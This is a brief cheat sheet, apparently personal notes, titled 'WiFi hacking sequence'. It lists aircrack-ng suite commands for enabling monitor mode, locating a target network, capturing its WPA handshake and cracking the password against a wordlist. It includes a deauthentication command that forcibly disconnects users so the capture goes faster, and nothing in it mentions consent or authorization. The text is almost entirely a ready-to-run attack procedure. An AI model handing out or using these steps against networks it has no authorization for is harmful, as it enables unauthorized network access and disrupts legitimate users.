WiFi hacking sequence {

1: Set network card to monitor mode

Code: sudo airmon-ng start wlan0

Tip: Specific network card needed
Tip 2: wlan0 => WiFi


2: Search for the exact WiFi

Code: sudo airodump-ng wlan0mon # means monitor WiFi

Tip: Get BSSID (MAC) and CH (channel)


3: Capture (get) handshake (handshake means the invites both send to each other to identify themselves and connect to the WiFi)

Code: sudo airodump-ng -c <CH> --bssid <bssid> -w file_capt wlan0mon

Faster code (kick users for faster capture): sudo aireplay-ng -0 <deauth invites int> -a <bssid> wlan0mon

Tip: -a means focus on that specific bssid


4: Break the password (based on the handshake data)

Code: aircrack-ng -w <path-to-wordlist.txt> -b <bssid> file_capt.cap

Tip: for weird passwords, use dedicated wordlist (custom)
